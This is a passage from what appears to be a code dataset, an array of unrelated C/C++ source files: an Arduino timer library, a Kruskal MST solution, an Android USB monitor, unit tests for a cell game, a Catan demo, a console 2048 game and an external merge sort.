ui->label->setPixmap(pm);\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n",
    "/*\n *  Interrupt and PWM utilities for 16 bit Timer1 on ATmega168/328\n *  Original code by Jesse Tane for http://labs.ideo.com August 2008\n *  Modified March 2009 by J\u00e9r\u00f4me Despatis and Jesse Tane for ATmega328 support\n *  Modified June 2009 by Michael Polli and Jesse Tane to fix a bug in setPeriod() which caused the timer to stop\n *  Modified June 2011 by Lex Talionis to add a function to read the timer\n *  Modified Oct 2011 by Andrew Richards to avoid certain problems:\n *  - Add (long) assignments and casts to TimerOne::read() to ensure calculations involving tmp, ICR1 and TCNT1 aren't truncated\n *  - Ensure 16 bit registers accesses are atomic - run with interrupts disabled when accessing\n *  - Remove global enable of interrupts (sei())- could be running within an interrupt routine)\n *  - Disable interrupts whilst TCTN1 == 0.  Datasheet vague on this, but experiment shows that overflow interrupt \n *    flag gets set whilst TCNT1 == 0, resulting in a phantom interrupt.  Could just set to 1, but gets inaccurate\n *    at very short durations\n *  - startBottom() added to start counter at 0 and handle all interrupt enabling.\n *  - start() amended to enable interrupts\n *  - restart() amended to point at startBottom()\n * Modiied 7:26 PM Sunday, October 09, 2011 by Lex Talionis\n *  - renamed start() to resume() to reflect it's actual role\n *  - renamed startBottom() to start(). This breaks some old code that expects start to continue counting where it left off\n *\n *  This program is free software: you can redistribute it and/or modify\n *\tit under the terms of the GNU General Public License as published by\n *\tthe Free Software Foundation, either version 3 of the License, or\n *\t(at your option) any later version.\n *\n *\tThis program is distributed in the hope that it will be useful,\n *\tbut WITHOUT ANY WARRANTY; without even the implied warranty of\n *\tMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n *\tGNU General Public License for more details.\n *\n *\tYou should have received a copy of the GNU General Public License\n *\talong with this program.  If not, see <http://www.gnu.org/licenses/>.\n *\n *  See Google Code project http://code.google.com/p/arduino-timerone/ for latest\n */\n#ifndef TIMERONE_cpp\n#define TIMERONE_cpp\n\n#include \"TimerOne.h\"\n\nTimerOne Timer1;              // preinstatiate\n\nISR(TIMER1_OVF_vect)          // interrupt service routine that wraps a user defined function supplied by attachInterrupt\n{\n  Timer1.isrCallback();\n}\n\n\nvoid TimerOne::initialize(long microseconds)\n{\n  TCCR1A = 0;                 // clear control register A \n  TCCR1B = _BV(WGM13);        // set mode 8: phase and frequency correct pwm, stop the timer\n  setPeriod(microseconds);\n}\n\n\nvoid TimerOne::setPeriod(long microseconds)\t\t// AR modified for atomic access\n{\n  \n  long cycles = (F_CPU / 2000000) * microseconds;                                // the counter runs backwards after TOP, interrupt is at BOTTOM so divide microseconds by 2\n  if(cycles < RESOLUTION)              clockSelectBits = _BV(CS10);              // no prescale, full xtal\n  else if((cycles >>= 3) < RESOLUTION) clockSelectBits = _BV(CS11);              // prescale by /8\n  else if((cycles >>= 3) < RESOLUTION) clockSelectBits = _BV(CS11) | _BV(CS10);  // prescale by /64\n  else if((cycles >>= 2) < RESOLUTION) clockSelectBits = _BV(CS12);              // prescale by /256\n  else if((cycles >>= 2) < RESOLUTION) clockSelectBits = _BV(CS12) | _BV(CS10);  // prescale by /1024\n  else        cycles = RESOLUTION - 1, clockSelectBits = _BV(CS12) | _BV(CS10);  // request was out of bounds, set as maximum\n  \n  oldSREG = SREG;\t\t\t\t\n  cli();\t\t\t\t\t\t\t// Disable interrupts for 16 bit register access\n  ICR1 = pwmPeriod = cycles;                                          // ICR1 is TOP in p & f correct pwm mode\n  SREG = oldSREG;\n  \n  TCCR1B &= ~(_BV(CS10) | _BV(CS11) | _BV(CS12));\n  TCCR1B |= clockSelectBits;                                          // reset clock select register, and starts the clock\n}\n\nvoid TimerOne::setPwmDuty(char pin, int duty)\n{\n  unsigned long dutyCycle = pwmPeriod;\n  \n  dutyCycle *= duty;\n  dutyCycle >>= 10;\n  \n  oldSREG = SREG;\n  cli();\n  if(pin == 1 || pin == 9)       OCR1A = dutyCycle;\n  else if(pin == 2 || pin == 10) OCR1B = dutyCycle;\n  SREG = oldSREG;\n}\n\nvoid TimerOne::pwm(char pin, int duty, long microseconds)  // expects duty cycle to be 10 bit (1024)\n{\n  if(microseconds > 0) setPeriod(microseconds);\n  if(pin == 1 || pin == 9) {\n    DDRB |= _BV(PORTB1);                                   // sets data direction register for pwm output pin\n    TCCR1A |= _BV(COM1A1);                                 // activates the output pin\n  }\n  else if(pin == 2 || pin == 10) {\n    DDRB |= _BV(PORTB2);\n    TCCR1A |= _BV(COM1B1);\n  }\n  setPwmDuty(pin, duty);\n  resume();\t\t\t// Lex - make sure the clock is running.  We don't want to restart the count, in case we are starting the second WGM\n\t\t\t\t\t// and the first one is in the middle of a cycle\n}\n\nvoid TimerOne::disablePwm(",
    "#include <bits/stdc++.h>\n// #define ll long long int\nusing namespace std;\nint parent[100005];\nlong long int group_size[100005];\nclass Edge\n{\npublic:\n    int u, v, w;\n    Edge(int u, int v, int w)\n    {\n        this->u = u;\n        this->v = v;\n        this->w = w;\n    }\n};\nbool cmp(Edge a, Edge b)\n{\n    return a.w < b.w;\n}\nvoid dsu_initialize(int n)\n{\n    for (int i = 0; i < n; i++)\n    {\n        parent[i] = -1;\n        group_size[i] = 1;\n    }\n}\nint find(int node)\n{\n    if (parent[node] == -1)\n        return node;\n    int l = find(parent[node]);\n    parent[node] = l;\n    return l;\n}\nvoid union_by_size(int node, int node2)\n{\n    int lA = find(node);\n    int lB = find(node2);\n    if (group_size[lA] > group_size[lB])\n    {\n        parent[lB] = lA;\n        group_size[lA] += group_size[lB];\n    }\n    else\n    {\n        parent[lA] = lB;\n        group_size[lB] += group_size[lA];\n    }\n}\nint main()\n{\n\n    long long int totalSize = 0;\n    int n, e;\n    vector<Edge> edgelist;\n   int cnt=0;\n    cin >> n >> e;\n    dsu_initialize(n);\n    while (e--)\n    {\n        int u, v, w;\n        cin >> u >> v >> w;\n        edgelist.push_back(Edge(u, v, w));\n    }\n    sort(edgelist.begin(), edgelist.end(), cmp);\n    for (Edge ans : edgelist)\n    {\n        int lU = find(ans.u);\n        int lV = find(ans.v);\n        if (lU == lV)\n        {\n            continue;\n        }\n        else\n        {\n            union_by_size(ans.u, ans.v);\n            totalSize += ans.w;\n            cnt++;\n        }\n    }\n    if(cnt==n-1)\n    {\n        cout << totalSize << endl;\n    }\n    else{\n        cout<<\"IMPOSSIBLE\";\n    }\n   \n    return 0;\n}",
    "/*\n * Copyright (C) 2023 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"android.hardware.usb.aidl-service.UsbDataSessionMonitor\"\n\n#include \"UsbDataSessionMonitor.h\"\n\n#include <aidl/android/frameworks/stats/IStats.h>\n#include <android-base/file.h>\n#include <android-base/logging.h>\n#include <android_hardware_usb_flags.h>\n#include <cutils/uevent.h>\n#include <pixelstats/StatsHelper.h>\n#include <pixelusb/CommonUtils.h>\n#include <sys/epoll.h>\n#include <utils/Log.h>\n\n#include <regex>\n\nnamespace usb_flags = android::hardware::usb::flags;\n\nusing aidl::android::frameworks::stats::IStats;\nusing android::base::ReadFileToString;\nusing android::hardware::google::pixel::getStatsService;\nusing android::hardware::google::pixel::reportUsbDataSessionEvent;\nusing android::hardware::google::pixel::PixelAtoms::VendorUsbDataSessionEvent;\nusing android::hardware::google::pixel::usb::addEpollFd;\nusing android::hardware::google::pixel::usb::BuildVendorUsbDataSessionEvent;\n\nnamespace aidl {\nnamespace android {\nnamespace hardware {\nnamespace usb {\n\n#define UEVENT_MSG_LEN 2048\n#define USB_STATE_MAX_LEN 20\n#define DATA_ROLE_MAX_LEN 10\n\nconstexpr char kUdcConfigfsPath[] = \"/config/usb_gadget/g1/UDC\";\nconstexpr char kNotAttachedState[] = \"not attached\\n\";\nconstexpr char kAttachedState[] = \"attached\\n\";\nconstexpr char kPoweredState[] = \"powered\\n\";\nconstexpr char kDefaultState[] = \"default\\n\";\nconstexpr char kAddressedState[] = \"addressed\\n\";\nconstexpr char kConfiguredState[] = \"configured\\n\";\nconstexpr char kSuspendedState[] = \"suspended\\n\";\nconst std::set<std::string> kValidStates = {kNotAttachedState, kAttachedState,  kPoweredState,\n                                            kDefaultState,     kAddressedState, kConfiguredState,\n                                            kSuspendedState};\n\nstatic int addEpollFile(const int &epollFd, const std::string &filePath, unique_fd &fileFd) {\n    struct epoll_event ev;\n\n    unique_fd fd(open(filePath.c_str(), O_RDONLY));\n\n    if (fd.get() == -1) {\n        ALOGI(\"Cannot open %s\", filePath.c_str());\n        return -1;\n    }\n\n    ev.data.fd = fd.get();\n    ev.events = EPOLLPRI;\n\n    if (epoll_ctl(epollFd, EPOLL_CTL_ADD, fd.get(), &ev) != 0) {\n        ALOGE(\"epoll_ctl failed; errno=%d\", errno);\n        return -1;\n    }\n\n    fileFd = std::move(fd);\n    ALOGI(\"epoll registered %s\", filePath.c_str());\n    return 0;\n}\n\nstatic void removeEpollFile(const int &epollFd, const std::string &filePath, unique_fd &fileFd) {\n    epoll_ctl(epollFd, EPOLL_CTL_DEL, fileFd.get(), NULL);\n    fileFd.release();\n\n    ALOGI(\"epoll unregistered %s\", filePath.c_str());\n}\n\nUsbDataSessionMonitor::UsbDataSessionMonitor(\n    const std::string &deviceUeventRegex, const std::string &deviceStatePath,\n    const std::string &host1UeventRegex, const std::string &host1StatePath,\n    const std::string &host2UeventRegex, const std::string &host2StatePath,\n    const std::string &dataRolePath, std::function<void()> updatePortStatusCb) {\n    struct epoll_event ev;\n    std::string udc;\n\n    unique_fd epollFd(epoll_create(8));\n    if (epollFd.get() == -1) {\n        ALOGE(\"epoll_create failed; errno=%d\", errno);\n        abort();\n    }\n\n    unique_fd ueventFd(uevent_open_socket(64 * 1024, true));\n    if (ueventFd.get() == -1) {\n        ALOGE(\"uevent_open_socket failed\");\n        abort();\n    }\n    fcntl(ueventFd, F_SETFL, O_NONBLOCK);\n\n    if (addEpollFd(epollFd, ueventFd))\n        abort();\n\n    if (addEpollFile(epollFd.get(), dataRolePath, mDataRoleFd) != 0) {\n        ALOGE(\"monitor data role failed\");\n        abort();\n    }\n\n    /*\n     * The device state file could be absent depending on the current data role\n     * and driver architecture. It's ok for addEpollFile to fail here, the file\n     * will be monitored later when its presence is detected by uevent.\n     */\n    mDeviceState.filePath = deviceStatePath;\n    mDeviceState.ueventRegex = deviceUeventRegex;\n    addEpollFile(epollFd.get(), mDeviceState.filePath, mDeviceState.fd);\n\n    mHost1State.filePath = host1StatePath;\n    mHost1State.ueventRegex = host1UeventRegex;\n    addEpollFile(epollFd.get(), mHost1State.filePath, mHost1State.fd);\n\n    mHost2State.filePath = host2StatePath;\n    mHost2State.ueventRegex = host2UeventRegex;\n    addEpollFile(epollFd.get(), mHost2State.filePath, mHost2State.fd);\n\n    mEpollFd = std::move(epollFd);\n    mUeventFd = std::move(ueventFd);\n    mUpdatePortStatusCb = updatePortStatusCb;\n\n    if (ReadFileTo",
    "#include \"concurrent_file_word_stream.hpp\"\n\n#include <cctype>\n#include <stdexcept>\n\nConcurrentFileWordStream::ConcurrentFileWordStream(const std::string &filename,\n                                                   std::size_t start,\n                                                   std::size_t end)\n    : m_fileReader(filename), m_currentPosition(start), m_end(end) {\n  if (!m_fileReader.isOpen())\n    throw std::runtime_error(\"Unable to open the file: \" + filename);\n  if (m_end == 0)\n    m_end = m_fileReader.size();\n  advance();\n}\n\nstd::string ConcurrentFileWordStream::next() {\n  std::string temp = std::move(m_currentWord);\n  advance();\n  return temp;\n}\n\nbool ConcurrentFileWordStream::hasNext() const {\n  return !m_currentWord.empty();\n}\n\nvoid ConcurrentFileWordStream::advance() {\n  m_currentWord.clear();\n  while (m_currentPosition < m_end) {\n    auto symbol = m_fileReader.fileData[m_currentPosition++];\n    if (('A' <= symbol && symbol <= 'Z') || ('a' <= symbol && symbol <= 'z')) {\n      if (symbol < 'a')\n        symbol += ('a' - 'A');\n      m_currentWord += symbol;\n    } else if (!m_currentWord.empty())\n      break;\n  }\n}\n",
    "#include \"pch.h\"\n#include \"CppUnitTest.h\"\n#include <string>\n#include\"../CELLGAME/GameMap.h\"\n#include\"../CELLGAME/GameRule.h\"\n#include\"../CELLGAME/GameMap.cpp\"\n#include\"../CELLGAME/GameRule.cpp\"\n\nusing namespace Microsoft::VisualStudio::CppUnitTestFramework;\n\n\nnamespace CELLGAMETEST\n{\n\tTEST_CLASS(CEllGAMEMAP)\n\t{\n\tpublic:\n\n\t\tTEST_METHOD(setMap)\n\t\t{\n\t\t\tbool** aMap = new bool* [HEIGHT];\n\t\t\tfor (int i = 0; i < HEIGHT * WIDE; i++) {\n\t\t\t\tfor (int j = 0; j < HEIGHT; j++) {\n\t\t\t\t\taMap[j] = new bool[WIDE];\n\t\t\t\t\tfor (int k = 0; k < WIDE; k++) {\n\t\t\t\t\t\taMap[j][k] = i % 2;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tGameMap* gameMap = new GameMap();\n\t\t\tgameMap->setMap(aMap, 50);\n\n\t\t\tfor (int i = 1; i < HEIGHT - 1; i++) {\n\t\t\t\tfor (int j = 1; j < WIDE - 1; j++) {\n\t\t\t\t\tAssert::AreEqual(aMap[i][j], gameMap->getElement(i, j));\n\t\t\t\t}\n\t\t\t}\n\n\t\t}\n\n\t\t\n\t};\n\tTEST_CLASS(CEllGAMERULE) {\n\t\tTEST_METHOD(judgeElementTest01) {\n\n\t\t\tGameMap gameMap;\n\t\t\tGameRule gameRule(&gameMap);\n\n\t\t\tbool aMap[3][3] = {\n\t\t\t\t{0,0,0},\n\t\t\t\t{0,1,0},\n\t\t\t\t{1,0,0}\n\t\t\t};\n\n\t\t\tbool** theMap = new bool* [3];\n\t\t\tfor (int i = 0; i < 3; i++) {\n\t\t\t\ttheMap[i] = new bool[3];\n\t\t\t\tfor (int j = 0; j < 3; j++) {\n\t\t\t\t\ttheMap[i][j] = aMap[i][j];\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tAssert::AreEqual(false, gameRule.judgeElement(1, 1, theMap));\n\t\t}\n\t\tTEST_METHOD(judgeElementTest02) {\n\n\t\t\tGameMap gameMap;\n\t\t\tGameRule gameRule(&gameMap);\n\n\t\t\tbool aMap[3][3] = {\n\t\t\t\t{0,0,1},\n\t\t\t\t{0,1,0},\n\t\t\t\t{1,0,1}\n\t\t\t};\n\n\t\t\tbool** theMap = new bool* [3];\n\t\t\tfor (int i = 0; i < 3; i++) {\n\t\t\t\ttheMap[i] = new bool[3];\n\t\t\t\tfor (int j = 0; j < 3; j++) {\n\t\t\t\t\ttheMap[i][j] = aMap[i][j];\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tAssert::AreEqual(true, gameRule.judgeElement(1, 1, theMap));\n\t\t}\n\t\tTEST_METHOD(judgeElementTest03) {\n\n\t\t\tGameMap gameMap;\n\t\t\tGameRule gameRule(&gameMap);\n\n\t\t\tbool aMap[3][3] = {\n\t\t\t\t{1,1,1},\n\t\t\t\t{1,1,1},\n\t\t\t\t{1,1,1}\n\t\t\t};\n\n\t\t\tbool** theMap = new bool* [3];\n\t\t\tfor (int i = 0; i < 3; i++) {\n\t\t\t\ttheMap[i] = new bool[3];\n\t\t\t\tfor (int j = 0; j < 3; j++) {\n\t\t\t\t\ttheMap[i][j] = aMap[i][j];\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tAssert::AreEqual(false, gameRule.judgeElement(1, 1, theMap));\n\t\t}\n\t\tTEST_METHOD(judgeElementTest04) {\n\n\t\t\tGameMap gameMap;\n\t\t\tGameRule gameRule(&gameMap);\n\n\t\t\tbool aMap[3][3] = {\n\t\t\t\t{1,1,1},\n\t\t\t\t{1,0,1},\n\t\t\t\t{1,1,1}\n\t\t\t};\n\n\t\t\tbool** theMap = new bool* [3];\n\t\t\tfor (int i = 0; i < 3; i++) {\n\t\t\t\ttheMap[i] = new bool[3];\n\t\t\t\tfor (int j = 0; j < 3; j++) {\n\t\t\t\t\ttheMap[i][j] = aMap[i][j];\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tAssert::AreEqual(false, gameRule.judgeElement(1, 1, theMap));\n\t\t}\n\t\tTEST_METHOD(judgeElementTest05) {\n\n\t\t\tGameMap gameMap;\n\t\t\tGameRule gameRule(&gameMap);\n\n\t\t\tbool aMap[3][3] = {\n\t\t\t\t{1,0,0},\n\t\t\t\t{1,0,0},\n\t\t\t\t{1,1,0}\n\t\t\t};\n\n\t\t\tbool** theMap = new bool* [3];\n\t\t\tfor (int i = 0; i < 3; i++) {\n\t\t\t\ttheMap[i] = new bool[3];\n\t\t\t\tfor (int j = 0; j < 3; j++) {\n\t\t\t\t\ttheMap[i][j] = aMap[i][j];\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tAssert::AreEqual(false, gameRule.judgeElement(1, 1, theMap));\n\t\t}\n\t\tTEST_METHOD(judgeElementTest06) {\n\n\t\t\tGameMap gameMap;\n\t\t\tGameRule gameRule(&gameMap);\n\n\t\t\tbool aMap[3][3] = {\n\t\t\t\t{1,0,0},\n\t\t\t\t{1,0,0},\n\t\t\t\t{0,1,0}\n\t\t\t};\n\n\t\t\tbool** theMap = new bool* [3];\n\t\t\tfor (int i = 0; i < 3; i++) {\n\t\t\t\ttheMap[i] = new bool[3];\n\t\t\t\tfor (int j = 0; j < 3; j++) {\n\t\t\t\t\ttheMap[i][j] = aMap[i][j];\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tAssert::AreEqual(true, gameRule.judgeElement(1, 1, theMap));\n\t\t}\n\t\tTEST_METHOD(judgeElementTest07) {\n\n\t\t\tGameMap gameMap;\n\t\t\tGameRule gameRule(&gameMap);\n\n\t\t\tbool aMap[3][3] = {\n\t\t\t\t{0,0,0},\n\t\t\t\t{1,0,0},\n\t\t\t\t{0,1,0}\n\t\t\t};\n\n\t\t\tbool** theMap = new bool* [3];\n\t\t\tfor (int i = 0; i < 3; i++) {\n\t\t\t\ttheMap[i] = new bool[3];\n\t\t\t\tfor (int j = 0; j < 3; j++) {\n\t\t\t\t\ttheMap[i][j] = aMap[i][j];\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tAssert::AreEqual(false, gameRule.judgeElement(1, 1, theMap));\n\t\t}\n\t\tTEST_METHOD(judgeElementTest08) {\n\n\t\t\tGameMap gameMap;\n\t\t\tGameRule gameRule(&gameMap);\n\n\t\t\tbool aMap[3][3] = {\n\t\t\t\t{0,0,0},\n\t\t\t\t{1,1,0},\n\t\t\t\t{0,1,0}\n\t\t\t};\n\n\t\t\tbool** theMap = new bool* [3];\n\t\t\tfor (int i = 0; i < 3; i++) {\n\t\t\t\ttheMap[i] = new bool[3];\n\t\t\t\tfor (int j = 0; j < 3; j++) {\n\t\t\t\t\ttheMap[i][j] = aMap[i][j];\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tAssert::AreEqual(true, gameRule.judgeElement(1, 1, theMap));\n\t\t}\n\t};\n}",
    "/* ID: 207970252\n    Mail: Shlomi55577@gmail.com */\n\n#include <iostream>\n#include <stdexcept>\n#include <vector>\n#include \"Catan.hpp\"\n#include \"Player.hpp\"\n#include \"Board.hpp\"\nusing namespace std;\nusing namespace ariel;\n\nint main()\n{\n    Player p1(\"Amit\",\"red\");\n    Player p2(\"Yossi\",\"blue\");\n    Player p3(\"Dana\",\"yellow\");\n    Catan catan(p1, p2, p3);\n    // Starting of the game. Every player places two settlements and two roads.\n    catan.ChooseStartingPlayer();   // should print the name of the starting player, assume it is Amit.\n    vector<Player*> allPlayers = catan.getPlayers();\n    Board board;// get the board of the game.\n    board.createBoard();\n    allPlayers[0]->placeSettelemnt(Vertex::getVertex(-3,-1));\n    allPlayers[0]->placeRoad(Edge::getEdge(Vertex::getVertex(-3,-1),Vertex::getVertex(-3,1)));\n\n    allPlayers[1]->ChangeToHisTurn(allPlayers);\n    allPlayers[1]->placeSettelemnt(Vertex::getVertex(1,-5));\n    allPlayers[1]->placeRoad(Edge::getEdge(Vertex::getVertex(1,-5),Vertex::getVertex(0,-4)));\n\n    allPlayers[2]->ChangeToHisTurn(allPlayers);\n    allPlayers[2]->placeSettelemnt(Vertex::getVertex(3,1));\n    allPlayers[2]->placeRoad(Edge::getEdge(Vertex::getVertex(3,1),Vertex::getVertex(4,2)));\n\n    allPlayers[2]->placeSettelemnt(Vertex::getVertex(2,-2));\n    allPlayers[2]->placeRoad(Edge::getEdge(Vertex::getVertex(2,-2),Vertex::getVertex(3,-1)));\n\n    allPlayers[1]->ChangeToHisTurn(allPlayers);\n    allPlayers[1]->placeSettelemnt(Vertex::getVertex(-2,4));\n    allPlayers[1]->placeRoad(Edge::getEdge(Vertex::getVertex(-2,4),Vertex::getVertex(-3,5)));\n\n    allPlayers[0]->ChangeToHisTurn(allPlayers);\n    allPlayers[0]->placeSettelemnt(Vertex::getVertex(0,4));\n    allPlayers[0]->placeRoad(Edge::getEdge(Vertex::getVertex(0,4),Vertex::getVertex(-1,5)));\n\n    for(int i = 0; i < allPlayers.size(); i++)\n    {\n        catan.rollDice(allPlayers[i]);\n        allPlayers[i]->TradeWhatNeeded(allPlayers);\n        allPlayers[i]->placeCities();\n        allPlayers[i]->placeSettelments();\n        if(catan.buyDevelopmentCard(allPlayers[i]))\n        {\n            allPlayers[i]->useDevelopmentCard(allPlayers);\n        }\n        allPlayers[i]->placeRoads();\n    }\n}\n\n",
    "#pragma warning(disable: 4244)\n#include <iostream>\n#include <iomanip>\n#include <ctime>\n#include <cstdlib>\n#include \"Player.h\"\n\nint board[4][4];\nint dirLine[] = { 1, 0, -1, 0 };\nint dirColumn[] = { 0, 1, 0, -1 };\nint currentScore = 0;\n\nstd::pair<int, int> generateUnoccupiedPosition() {\n    int occupied = 1, line, column;\n    while (occupied) {\n        line = rand() % 4;\n        column = rand() % 4;\n        if (board[line][column] == 0)\n            occupied = 0;\n    }\n    return std::make_pair(line, column);\n}\n\nvoid addPiece() {\n    std::pair<int, int> pos = generateUnoccupiedPosition();\n    board[pos.first][pos.second] = 2;\n}\n\nvoid newGame() {\n    for (int i = 0; i < 4; ++i)\n        for (int j = 0; j < 4; ++j)\n            board[i][j] = 0;\n    addPiece();\n    currentScore = 0;\n}\n\nvoid printUI(const Player& player) {\n    system(\"cls\");\n    std::cout << \"Player: \" << player.getUsername() << \"\\n\";\n    std::cout << \"Score: \" << currentScore << \"\\n\";\n    std::cout << \"Best Score: \" << player.getBestScore() << \"\\n\";\n    for (int i = 0; i < 4; ++i) {\n        for (int j = 0; j < 4; ++j)\n            if (board[i][j] == 0)\n                std::cout << std::setw(4) << \".\";\n            else\n                std::cout << std::setw(4) << board[i][j];\n        std::cout << \"\\n\";\n    }\n    std::cout << \"n: new game, w: up, s: down, d: right, a: left, q: quit\\n\";\n}\n\nbool canDoMove(int line, int column, int nextLine, int nextColumn) {\n    if (nextLine < 0 || nextColumn < 0 || nextLine >= 4 || nextColumn >= 4\n        || (board[line][column] != board[nextLine][nextColumn] && board[nextLine][nextColumn] != 0))\n        return false;\n    return true;\n}\n\nvoid applyMove(int direction) {\n    int startLine = 0, startColumn = 0, lineStep = 1, columnStep = 1;\n    if (direction == 0) {\n        startLine = 3;\n        lineStep = -1;\n    }\n    if (direction == 1) {\n        startColumn = 3;\n        columnStep = -1;\n    }\n    int movePossible = 0, canAddPiece = 0;\n    do {\n        movePossible = 0;\n\n        for (int i = startLine; i >= 0 && i < 4; i += lineStep)\n            for (int j = startColumn; j >= 0 && j < 4; j += columnStep) {\n                int nextI = i + dirLine[direction], nextJ = j + dirColumn[direction];\n                if (board[i][j] != 0 && canDoMove(i, j, nextI, nextJ)) {\n                    if (board[nextI][nextJ] == board[i][j]) {\n                        board[nextI][nextJ] += board[i][j];\n                        currentScore += board[nextI][nextJ];\n                    }\n                    else {\n                        board[nextI][nextJ] = board[i][j];\n                    }\n                    board[i][j] = 0;\n                    movePossible = 1;\n                    canAddPiece = 1;\n                }\n            }\n    } while (movePossible);\n\n    if (canAddPiece)\n        addPiece();\n}\n\nint main() {\n    srand(time(0));\n    char commandToDir[128]; //0-128 ascii chars\n    commandToDir['s'] = 0;\n    commandToDir['d'] = 1;\n    commandToDir['w'] = 2;\n    commandToDir['a'] = 3;\n\n    char username[50];\n    std::cout << \"Enter your username: \";\n    std::cin >> username;\n    Player player(username);\n\n    player.savePlayerData(player);\n    newGame();\n    while (true) {\n        printUI(player);\n        char command;\n        std::cin >> command;\n\n        if (command == 'n') {\n            player.setBestScore(currentScore, player);\n            newGame();\n        }\n        else if (command == 'q') {\n            player.setBestScore(currentScore, player);\n            break;\n        }\n        else {\n            int currentDirection = commandToDir[command];\n            applyMove(currentDirection);\n        }\n    }\n    return 0;\n}\n",
    "#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <algorithm>\n#include <vector>\n#include <csetjmp>\n\njmp_buf env;\n\nint PARALLEL_SIZE;\nint current_index;\nint parallel_number;\n\n\nint read_file_time = 0,\n\twrite_file_time = 0;\n\nFILE* ffopen(const char* file_name, const char* mode){\n\tFILE* file = nullptr;\n\tfile = fopen(file_name, mode);\n\tif\t(strcmp(mode, \"r\")==0)\tread_file_time++;\n\telse\t\t\t\t\t\twrite_file_time++;\n\tif (file == nullptr) {\n\t\tprintf(\"Unable to open %s\\n\", file_name);\n\t\tlongjmp(env, 10);\n\t}\n\tfseek(file, 0, SEEK_SET);\n\treturn file;\n}\n\nint get_min_number_among_pow_of_2_which_is_greater_than(int x){\n\tint i=0;\n\tint xx = x;\n\tfor (; x!=1; x>>=1){\n\t\ti++;\n\t}\n\ti = 1<<i;\n\tif (xx == i)return i;\n\telse\t\treturn i<<1;\n}\n\nvoid write_file_name_to_buffer_by_number(char* buffer, int number){\n\tsprintf(buffer, \"temp_file_%d.txt\", number);\n}\n\nFILE* ffopen(int number, const char* mode){\n\tchar buffer[300];\n\twrite_file_name_to_buffer_by_number(buffer, number);\n\treturn ffopen(buffer, mode);\n}\n\nvoid fclear(FILE* file){\n\tfseek(file, 0, SEEK_SET);\n\tfprintf(file, \" \");\n}\n\n\nvoid fclear(const char* file_name){\n\tFILE* file = ffopen(file_name, \"w\");\n\tfclear(file);\n\tfclose(file);\n}\n\nvoid fclear(int number){\n\tchar buffer[300];\n\twrite_file_name_to_buffer_by_number(buffer, number);\n\tfclear(buffer);\n}\n\nvoid fmove(FILE* from, FILE* to){\n\tint size, record;\n\tfscanf(from,\t\"%d\",\t&size);\n\tfprintf(to  , \"%d\\n\",\tsize);\n\n\tfor (int i=0; i<size; i++){\n\t\tfscanf(from, \"%d\", &record);\n\t\tfprintf(to, \"%d\\n\", record);\n\t}\n}\n\nvoid fmove(const char* from, const char* to){\n\tFILE* ffrom= ffopen(from, \"r\");\n\tFILE* tto  = ffopen(to,\t  \"w\");\n\tfmove(ffrom, tto);\n\tfclose(ffrom);\n\tfclose(tto);\n\t\n\tfclear(from);\n}\n\nvoid fmove(int from, int to){\n\tchar buffer1[300], buffer2[300];\n\twrite_file_name_to_buffer_by_number(buffer1, from);\n\twrite_file_name_to_buffer_by_number(buffer2, to);\n\tfmove(buffer1, buffer2);\n}\n\n\nvoid fmerge(FILE* from1, FILE* from2, FILE* to){\n\tint child1_size,\n\t\tchild2_size,\n\t\tfather_size;\n\t\n\tfscanf(from1, \"%d\", &child1_size);\n\tfscanf(from2, \"%d\", &child2_size);\n\tfather_size = child1_size + child2_size;\n\tfprintf(to,\t  \"%d\\n\", father_size);\n\n\tint child1_record, child2_record;\n\tfscanf(from1, \"%d\", &child1_record);\n\tfscanf(from2, \"%d\", &child2_record);\n\n\tint child1_index = 0,\n\t\tchild2_index = 0;\n\t\n\tfor (;;){\n\t\tif (child1_record < child2_record){\n\t\t\tfprintf(to, \"%d\\n\", child1_record);\n\t\t\tchild1_index++;\n\t\t\tif (child1_index < child1_size){\n\t\t\t\tfscanf(from1, \"%d\", &child1_record);\n\t\t\t}\n\t\t\telse break;\n\t\t} else {\n\t\t\tfprintf(to, \"%d\\n\", child2_record);\n\t\t\tchild2_index++;\n\t\t\tif (child2_index < child2_size){\n\t\t\t\tfscanf(from2, \"%d\", &child2_record);\n\t\t\t}\n\t\t\telse break;\n\t\t}\n\t} \n\n\tfor (; child1_index < child1_size; child1_index++){\n\t\tfprintf(to, \"%d\\n\", child1_record);\n\t\tfscanf(from1, \"%d\", &child1_record);\n\t}\n\t\n\tfor (; child2_index < child2_size; child2_index++){\n\t\tfprintf(to, \"%d\\n\", child2_record);\n\t\tfscanf(from2, \"%d\", &child2_record);\n\t}\n}\n\nvoid fmerge(const char*from1, const char* from2, const char* to){\n\tFILE* ffrom1 = ffopen(from1, \"r\");\n\tFILE* ffrom2 = ffopen(from2, \"r\");\n\tFILE* tto\t = ffopen(to,\t \"w\");\n\tfmerge(ffrom1, ffrom2, tto);\n\tfclose(ffrom1);\n\tfclose(ffrom2);\n\tfclose(tto);\n}\n\nvoid fmerge(int from1, int from2, int to){\n\tchar buffer1[300],\n\t\t buffer2[300],\n\t\t buffer3[300];\n\twrite_file_name_to_buffer_by_number(buffer1, from1);\n\twrite_file_name_to_buffer_by_number(buffer2, from2);\n\twrite_file_name_to_buffer_by_number(buffer3, to);\n\tfmerge(buffer1, buffer2, buffer3);\n}\n\nvoid generate_parallel(const char* file_name){\n\tFILE* input = ffopen(file_name, \"r\");\n\tint data_size;\n\n\tif (fscanf(input, \"%d\", &data_size) != 